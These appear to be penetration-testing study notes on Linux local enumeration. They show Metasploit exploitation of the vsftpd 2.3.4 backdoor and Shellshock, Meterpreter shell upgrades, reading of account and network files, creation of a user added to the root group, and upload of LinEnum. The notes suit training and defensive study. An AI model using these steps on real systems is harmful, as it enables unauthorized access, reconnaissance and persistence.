# LINUX LOCAL ENUMERATION

```
LINUX LOCAL ENUMERATION


1. ENUMERATING SYSTEM INFORMATION

	Initial Access
	
		> nmap scan
		
		ftp service at port 21 vsftpd 2.3.4
		
		> msf> search vsftpd
		> msf> use unix/ftp/vsftpd_234_backdoor
		> msf> run
		
		provides command shell session


	Upgrade Shell
	
		> /bin/bash -i
		
		root@victim: ^Z
		
		> msf> sessions -u 1
		> msf> sessions 2
		
		> meterpreter> getuid
		> meterpreter> sysinfo


	Drop to Shell
	
		> meterpreter> shell
		> /bin/bash -i


	System Information
	
		root@victim: hostname
		
		root@victim: cat /etc/issue
		(To know the linux distro)


	OS Version Details
	
		root@victim: cat /etc/*release
		(Provides detailed OS information)


	Kernel Information
	
		root@victim: uname -a
		(To know kernel version, hostname and OS)
		
		root@victim: uname -r
		(To know kernel version only)


	Hardware Information
	
		root@victim: lscpu
		(CPU information)
		
		root@victim: df -h
		(df → disk info, -h → human readable format)
		
		root@victim: dpkg -l
		(List installed packages)


-------------------------------------------------------------------


2. ENUMERATING USERS & GROUPS

	Initial Steps
	
		> nmap scan
		
		ftp service at port 21 vsftpd 2.3.4
		
		> msf> search vsftpd
		> msf> use unix/ftp/vsftpd_234_backdoor
		> msf> run


	Shell Upgrade
	
		> /bin/bash -i
		
		root@victim: ^Z
		
		> msf> sessions -u 1
		> msf> sessions 2
		
		> meterpreter> getuid
		> meterpreter> sysinfo
		> meterpreter> shell
		> /bin/bash -i


	User Information
	
		root@victim: whoami
		
		root@victim: groups root


	View All Users
	
		root@victim: cat /etc/passwd
		
		📌 Note:
		If a line ends with /bin/bash or /bin/sh → user account
		If /usr/sbin/nologin → service account


	Filter Real Users
	
		root@victim: cat /etc/passwd | grep -v /nologin
		
		(Removes service accounts)


	Create New User
	
		root@victim: useradd bob -s /bin/bash
		
		root@victim: cat /etc/passwd
		
		(bob is now present)


	Group Information
	
		root@victim: groups
		
		root@victim: groups bob


	Add User to Root Group
	
		root@victim: usermod -aG root bob
		
		(Adds bob to root group)


	Login History
	
		root@victim: lastlog
		
		(View logged-in users history)


-------------------------------------------------------------------


3. ENUMERATING NETWORK INFORMATION

	Initial Steps
	
		> nmap scan
		
		ftp service at port 21 vsftpd 2.3.4
		
		> msf> search vsftpd
		> msf> use unix/ftp/vsftpd_234_backdoor
		> msf> run


	Meterpreter Network Info
	
		> meterpreter> getuid
		> meterpreter> sysinfo
		> meterpreter> ifconfig
		> meterpreter> netstat
		> meterpreter> route


	Drop to Shell
	
		> meterpreter> shell
		> /bin/bash -i


	Network Configuration
	
		root@victim: ip a s
		
		root@victim: cat /etc/networks
		
		root@victim: cat /etc/hostname
		
		root@victim: cat /etc/hosts
		
		root@victim: cat /etc/resolv.conf
		
		root@victim: ^C


	Discover Other Hosts
	
		> meterpreter> arp
		
		(Find other devices on network)


-------------------------------------------------------------------


4. ENUMERATING PROCESSES & CRON JOBS

	Initial Steps
	
		> nmap scan
		
		ftp service at port 21 vsftpd 2.3.4
		
		> msf> search vsftpd
		> msf> use unix/ftp/vsftpd_234_backdoor
		> msf> run


	Process Enumeration
	
		> meterpreter> ps
		
		(for listing the running processes)


	Process ID
	
		> meterpreter> pgrep vsftpd
		
		(to view process ID)


	Drop to Shell
	
		> meterpreter> shell
		> /bin/bash -i 


	Processes with Root Privileges
	
		root@victim: ps aux | grep root
		
		(list the process with root privilege)


	Alternative (if ps not available)
	
		root@victim: top
		
		(utility to view the processes)


	Cron Jobs
	
		root@victim: crontab -l
		
		(display the cron jobs)
		
		root@victim: ls -al /etc/cron*
		
		root@victim: cat /etc/cron*
		
		(command to list schedule task)


-------------------------------------------------------------------


5. AUTOMATING LINUX LOCAL ENUMERATION

	Initial Discovery
	
		> nmap scan
		
		Apache httpd 2.4.6 


	Web Inspection
	
		go to the browser and enter the ip
		
		you find time interface is changing it means this is javascript 
		
		ctrl+u
		
		you find /gettime.cgi script in javascript


	📌 Important Insight:
	
	if you find cgi script in apache httpd 2.4.6 then it is vulnerable to shellshock


	Shellshock Exploitation
	
		> msf> search shellshock
		> msf> use multi/http/apache_mod_cgi_bash_env_exec
		> msf> set RHOSTS target_ip
		> msf> set TARGETURI /gettime.cgi
		> msf> run


	Post Exploitation
	
		> meterpreter> background


	Enumeration Modules
	
		> msf> search enum_configs
		> msf> use linux/gather/enum_configs
		
		> msf> search enum_network
		> msf> set linux/gather/enum_network
		
		> msf> search enum_system
		> msf> use linux/gather/enum_system
		
		> msf> search checkvm
		> msf> use linux/gather/checkvm
		
		> msf> sessions 1


-------------------------------------------------------------------


6. AUTOMATED ENUMERATION USING LINENUM

	LinEnum GitHub
	
		> https://github.com/rebootuser/LinEnum.git


	Upload Script
	
		copy the script of LinEnum.sh 
		
		paste the copied script in a file with .sh extension linenum.sh
		
		> meterpreter> upload linenum.sh


	Run Script
	
		> meterpreter> shell
		> /bin/bash -i
		
		root@victim: ls
		
		linenum.sh
		
		root@victim: chmod +x linenum.sh
		
		root@victim: ./linenum.sh | tee linenum.txt
		
		tee → saves output to file while displaying


	Download Results
	
		> meterpreter> download linenum.txt
```
